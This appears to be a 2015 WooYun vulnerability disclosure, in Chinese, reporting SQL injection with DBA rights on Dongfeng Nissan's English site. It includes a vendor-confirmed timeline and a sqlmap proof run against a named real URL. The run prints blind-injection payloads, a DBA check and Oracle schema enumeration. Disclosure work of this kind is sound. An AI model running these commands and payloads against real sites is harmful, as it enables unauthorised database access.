wybug_title: 东风日产某国际英文主站高危SQL注入，DBA权限
wybug_detail:
漏洞详情 披露状态：   									2015-08-10：	细节已通知厂商并且等待厂商处理中									2015-08-10：	厂商已经确认，细节仅向厂商公开									2015-08-20：	细节向核心白帽子及相关领域专家公开									2015-08-30：	细节向普通白帽子公开									2015-09-09：	细节向实习白帽子公开									2015-09-24：	细节向公众公开  简要描述： RT 详细说明：  求高rank！深夜挖洞不易，且行且珍惜！英文国际主站：http://www.dfmg.com.cn/EN/Index.aspx

   漏洞证明：  




[root@Hacker~]# Sqlmap Sqlmap -u "http://www.dfmg.com.cn/EN/NewsDetail.aspx?ID=3238" --is-dba --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:50:44[22:50:44] [INFO] resuming back-end DBMS 'oracle'[22:50:44] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=3238 AND 8681=8681    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: ID=3238 AND 3885=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)---[22:50:45] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oracle[22:50:45] [INFO] testing if current user is DBA[22:50:45] [WARNING] reflective value(s) found and filtering outcurrent user is DBA:    True[22:50:45] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[22:50:45] [INFO] fetching database (schema) names[22:50:45] [INFO] fetching number of databases[22:50:45] [INFO] resumed: 16[22:50:45] [INFO] resumed: CTXSYS[22:50:45] [INFO] resumed: JBPM[22:50:45] [INFO] resumed: MDSYS[22:50:45] [INFO] resumed: ODM[22:50:45] [INFO] resumed: ODM_MTR[22:50:45] [INFO] resumed: OLAPSYS[22:50:45] [INFO] resumed: ORDSYS[22:50:45] [INFO] resumed: OUTLN[22:50:45] [INFO] resumed: PERFSTAT[22:50:45] [INFO] resumed: RMAN[22:50:45] [INFO] resumed: SCOTT[22:50:45] [INFO] resumed: SYS[22:50:45] [INFO] resumed: SYSTEM[22:50:45] [INFO] resumed: WKSYS[22:50:45] [INFO] resumed: WMSYS[22:50:45] [INFO] resumed: XDBavailable databases [16]:[*] CTXSYS[*] JBPM[*] MDSYS[*] ODM[*] ODM_MTR[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PERFSTAT[*] RMAN[*] SCOTT[*] SYS[*] SYSTEM[*] WKSYS[*] WMSYS[*] XDB[22:50:45] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[22:50:45] [INFO] fetched data logged to text files under 'F:\????\tools\SQLMAP~1.4\Bin\output\www.dfmg.com.cn'

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-08-10 09:45 厂商回复： 感谢提醒！ 最新状态： 暂无
